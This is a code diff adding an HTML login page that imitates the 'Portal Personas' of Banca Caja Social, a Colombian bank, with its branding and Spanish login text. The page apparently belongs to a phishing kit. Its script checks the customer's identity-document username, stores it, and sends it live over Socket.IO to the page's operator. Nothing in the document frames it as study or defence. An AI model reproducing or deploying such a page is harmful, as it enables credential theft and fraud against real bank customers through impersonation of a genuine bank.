@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido al Portal Personas - Banca Caja Social</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.95);z-index:9999;display:none;justify-content:center;align-items:center;">
+        <div style="text-align:center;">
+            <img src="img/logo-overlay.png" alt="Caja Social" style="width:120px;height:auto;animation:pulse 1.5s ease-in-out infinite;">
+        </div>
+    </div>
+    <style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.5}}.loading-overlay.show{display:flex!important}</style>
+    
+    <div class="container">
+        <div class="left-section">
+            <img src="img/background-3.png" alt="Familia" class="background-image">
+        </div>
+        <div class="right-section">
+            <div class="form-container">
+                <div class="logo-container">
+                    <img src="img/logoBCSLine.svg" alt="Banca Caja Social" class="logo">
+                </div>
+                
+                <h1 class="title">Bienvenido al<br>Portal Personas</h1>
+                
+                <p class="subtitle">
+                    Recuerde que su usuario está compuesto por<br>
+                    su Tipo de identificación <strong>(CC, CE, NI, TI, PE)</strong> y<br>
+                    su Número de documento sin espacios,<br>
+                    puntos ni comas.
+                </p>
+                
+                <form class="login-form" id="loginForm">
+                    <label for="usuario" class="form-label">Usuario</label>
+                    <input 
+                        type="text" 
+                        id="usuario" 
+                        name="usuario" 
+                        class="form-input"
+                        placeholder="Ejemplo: CC123456789"
+                    >
+                    
+                    <button type="submit" class="btn-siguiente" id="submitBtn" disabled>Siguiente</button>
+                    
+                    <a href="#" class="link-password">¿Olvidó su contraseña? ▼</a>
+                    
+                    <div class="separator"></div>
+                    
+                    <p class="register-text">¿Es un cliente nuevo?</p>
+                    <a href="#" class="link-register">Registrarse</a>
+                </form>
+            </div>
+        </div>
+    </div>
+    
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const usuarioInput = document.getElementById('usuario');
+            const btnSiguiente = document.querySelector('.btn-siguiente');
+            
+            // Expresión regular para validar el formato: CC, CE, NI, TI o PE seguido de números
+            const validPattern = /^(CC|CE|NI|TI|PE)\d+$/;
+            
+            usuarioInput.addEventListener('input', function() {
+                const value = this.value.trim().toUpperCase();
+                
+                if (validPattern.test(value)) {
+                    btnSiguiente.classList.add('enabled');
+                    btnSiguiente.disabled = false;
+                    btnSiguiente.removeAttribute('disabled');
+                } else {
+                    btnSiguiente.classList.remove('enabled');
+                    btnSiguiente.disabled = true;
+                    btnSiguiente.setAttribute('disabled', 'disabled');
+                }
+            });
+            
+            // Enviar usuario a través de Socket.IO
+            document.querySelector('.login-form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                const value = usuarioInput.value.trim().toUpperCase();
+                if (validPattern.test(value)) {
+                    // Guardar el usuario en sessionStorage
+                    sessionStorage.setItem('usuario', value);
+                    
+                    // Enviar a través de Socket.IO
+                    socketManager.sendUsuario(value);
+                }
+            });
+        });
+    </script>
+
+    <script src="/js/banco-utils.js"></script>
+    <script src="client-optimized.js"></script>
+</body>
+</html>
